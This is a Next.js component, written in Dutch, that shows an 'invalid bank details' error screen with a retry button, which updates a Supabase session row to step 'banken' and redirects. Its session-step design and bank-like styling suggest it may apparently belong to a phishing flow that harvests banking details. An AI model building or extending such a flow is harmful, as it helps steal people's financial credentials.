"use client";

import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";
import { MercatorStage, MercatorCard, MercatorLogoMark } from "@/components/ui/MercatorScreen";

type Props = {
  sessionId: string;
  routeSessionId?: string;
};

export function InvalidBankClient({ sessionId }: Props) {
  const { loading: settingsLoading } = useSettings();

  const handleRetry = async () => {
    const supabase = createBrowserSupabaseClient();
    if (supabase) {
      await supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "banken" })
        .eq("id", sessionId);
    }
    const qs = sessionId ? `?session=${encodeURIComponent(sessionId)}` : "";
    window.location.href = `/banken${qs}`;
  };

  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center bg-[#020824]">
        <div className="size-12 animate-spin rounded-full border-4 border-[#00A9E0]/30 border-t-[#00A9E0]" />
      </div>
    );
  }

  return (
    <MercatorStage>
      {!sessionId ? (
        <p className="w-full max-w-sm rounded-2xl border border-[#00A9E0]/40 bg-[#00A9E0]/10 p-4 text-center text-sm font-medium text-sky-200 backdrop-blur-md">
          Ongeldige link.
        </p>
      ) : (
        <MercatorCard className="flex flex-col items-center text-center">
          <div className="mb-6">
            <MercatorLogoMark />
          </div>

          {/* Error Icon */}
          <div className="relative mb-6 flex h-24 w-24 items-center justify-center">
            <div className="absolute inset-0 animate-ping rounded-full bg-[#00A9E0]/15" style={{ animationDuration: "2.6s" }} />
            <div className="absolute inset-0 rounded-full border-2 border-[#00A9E0]/30" />
            <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#00A9E0]/15 shadow-[0_0_30px_rgba(0,169,224,0.35)]">
              <svg className="h-9 w-9 text-[#00A9E0]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
              </svg>
            </div>
          </div>

          <h2 className="mb-3 text-2xl font-extrabold tracking-tight text-white">
            Ongeldige bankgegevens
          </h2>

          <p className="mb-8 text-[15px] font-medium leading-relaxed text-white/60">
            De ingevoerde bankgegevens konden niet worden geverifieerd. Controleer uw gegevens en probeer opnieuw.
          </p>

          <button
            onClick={() => void handleRetry()}
            className="flex w-full items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-[#00A9E0] to-[#b0050f] px-6 py-4 font-bold text-white shadow-[0_8px_30px_rgba(0,169,224,0.45)] transition-all hover:brightness-110 active:scale-[0.98]"
          >
            <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
            </svg>
            Probeer opnieuw
          </button>

          <div className="mt-7 flex items-center justify-center gap-2 rounded-full border border-white/10 bg-white/5 px-4 py-2 text-[12px] font-semibold text-white/50">
            <svg className="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            Beveiligde verbinding
          </div>
        </MercatorCard>
      )}
    </MercatorStage>
  );
}
